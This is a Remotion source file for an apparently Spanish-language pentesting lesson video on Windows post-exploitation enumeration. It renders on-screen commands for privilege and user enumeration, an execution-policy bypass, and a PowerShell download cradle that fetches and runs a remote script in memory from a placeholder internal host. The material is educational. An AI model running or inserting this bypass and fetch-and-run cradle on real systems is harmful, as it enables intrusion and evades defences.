// ── video/remotion/compositions/Ps04WindowsEnumeration.tsx ───────
// Video: pentesting I — enumeración de Windows.
// Clase 4 de Scripting/PowerShell (lección powershell-04). Guiones: voicebox-scripts/ps-04-*.txt
// Audios reales en public/videos/audio/ps-04-windows-enumeration/ (ffprobe 2026-08-26).

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, AUDIO_TIMINGS, hasAudio } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { KeyCapsule } from '../primitives/KeyCapsule';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

// ── Escena 1: la navaja suiza ───────────────────────────────────
const Scene1: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 32, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 18 }}>
      ENUMERACIÓN: <span style={{ color: THEME.red }}>TU NAVAJA SUIZA</span>
    </div>
    <div style={{ fontSize: 18, color: THEME.muted, fontFamily: MONO, marginBottom: 28 }}>
      El primer paso de la post-explotación en entornos Windows
    </div>
    <KeyCapsule label="primer paso" value="saber dónde estás parado" accent={THEME.cyan} delay={Math.round(2.5 * fps)} size={24} />
    <div style={{ marginTop: 24, fontSize: 17, color: THEME.muted, fontFamily: MONO, textAlign: 'left', width: 780 }}>
      <RevealLine at={5} fps={fps} mark="▸" color={THEME.cyan}>Procesos, servicios, usuarios y permisos del sistema</RevealLine>
      <div style={{ height: 10 }} />
      <RevealLine at={9} fps={fps} mark="▸" color={THEME.green}>Todo lo que en Linux enumeras con comandos, acá se hace con cmdlets</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Escena 2: privilegios, servicios, usuarios y registro ────────
const Scene2: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      PRIVILEGIOS Y <span style={{ color: THEME.green }}>RECONOCIMIENTO LOCAL</span>
    </div>
    <TerminalWindow title="PS C:\> .\enum_local.ps1" width={940} delay={Math.round(1.5 * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>
        <span style={{ color: THEME.cyan }}>whoami /priv</span><span style={{ color: THEME.dim }}>                        # SeDebugPrivilege es ORO (SYSTEM)</span>
        {'\n'}<span style={{ color: THEME.cyan }}>Get-Process</span><span style={{ color: THEME.text }}>; </span><span style={{ color: THEME.cyan }}>Get-Service</span><span style={{ color: THEME.dim }}>              # lista procesos y servicios SYSTEM</span>
        {'\n'}<span style={{ color: THEME.cyan }}>Get-ChildItem C:\Users -Recurse -Force</span><span style={{ color: THEME.dim }}> # caza de archivos y configs</span>
        {'\n'}<span style={{ color: THEME.cyan }}>net user</span><span style={{ color: THEME.text }}>; </span><span style={{ color: THEME.cyan }}>net localgroup Administrators</span><span style={{ color: THEME.dim }}>  # cuentas y administradores</span>
        {'\n'}<span style={{ color: THEME.cyan }}>Get-ItemProperty HKLM:\Software\...</span><span style={{ color: THEME.dim }}>    # lectura del registro</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 10, marginTop: 18, flexWrap: 'wrap', justifyContent: 'center' }}>
      <KeyCapsule label="whoami /priv" value="SeDebugPrivilege" accent={THEME.red} delay={Math.round(3.5 * fps)} size={16} />
      <KeyCapsule label="Get-Process / Service" value="servicios SYSTEM" accent={THEME.amber} delay={Math.round(8 * fps)} size={16} />
      <KeyCapsule label="net localgroup" value="grupo Administrators" accent={THEME.cyan} delay={Math.round(13 * fps)} size={16} />
    </div>
  </AbsoluteFill>
);

// ── Escena 3: bypass + download cradle ───────────────────────────
const Scene3: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      EJECUCIÓN: <span style={{ color: THEME.cyan }}>BYPASS Y DOWNLOAD CRADLE</span>
    </div>
    <TerminalWindow title="PS C:\> powershell -ep bypass ..." width={940} delay={Math.round(1.5 * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>
        <span style={{ color: THEME.dim }}># 1. Bypass por ejecución de script:</span>
        {'\n'}<span style={{ color: THEME.cyan }}>powershell -ep bypass -File .\enum.ps1</span>
        {'\n'}
        {'\n'}<span style={{ color: THEME.dim }}># 2. Download Cradle: descarga y corre en memoria (RAM) sin tocar disco</span>
        {'\n'}<span style={{ color: THEME.green }}>IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/recon.ps1')</span>
        {'\n'}<span style={{ color: THEME.amber }}>[*] El patrón estándar de casi todo payload de PowerShell</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 12, marginTop: 18 }}>
      <KeyCapsule label="-ep bypass" value="saltea ExecutionPolicy" accent={THEME.amber} delay={Math.round(3.5 * fps)} size={16} />
      <KeyCapsule label="IEX DownloadString" value="download cradle" accent={THEME.green} delay={Math.round(8 * fps)} size={16} />
      <KeyCapsule label="en memoria (RAM)" value="sin tocar disco" accent={THEME.cyan} delay={Math.round(13 * fps)} size={16} />
    </div>
  </AbsoluteFill>
);

export const Ps04WindowsEnumeration: React.FC = () => {
  const { fps } = useVideoConfig();
  const [s1, s2, s3] = AUDIO_TIMINGS['ps-04-windows-enumeration'];
  const starts = sceneStartFrames('ps-04-windows-enumeration', fps);
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const withAudio = hasAudio('ps-04-windows-enumeration');

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        {withAudio && <Audio src={staticFile('videos/audio/ps-04-windows-enumeration/ps-04-scene1.wav')} />}
        <Scene1 fps={fps} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        {withAudio && <Audio src={staticFile('videos/audio/ps-04-windows-enumeration/ps-04-scene2.wav')} />}
        <Scene2 fps={fps} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        {withAudio && <Audio src={staticFile('videos/audio/ps-04-windows-enumeration/ps-04-scene3.wav')} />}
        <Scene3 fps={fps} />
      </Sequence>
    </AbsoluteFill>
  );
};
